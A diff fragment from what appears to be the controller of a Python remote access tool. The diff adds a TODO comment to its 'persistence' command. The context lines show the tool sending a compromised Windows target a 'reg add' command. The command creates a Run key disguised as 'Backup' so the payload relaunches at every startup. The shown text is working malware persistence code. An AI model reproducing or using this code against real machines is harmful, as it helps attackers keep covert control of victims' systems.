@@ -179,7 +179,7 @@ if __name__ == '__main__':
                     else:
                         pass
 
-                case 'persistence':
+                case 'persistence':  # TODO: persistence path not correct
                     print('\033[93m[INFO] Attempting to set up persistence on the target...\033[0m')
                     if parameters[1] == 'registry': # adds a value to Run in HKCU to run the payload at startup
                         send_command(connections[session][0], 'command', 'reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v Backup /t REG_SZ /d "'+__file__+'"')
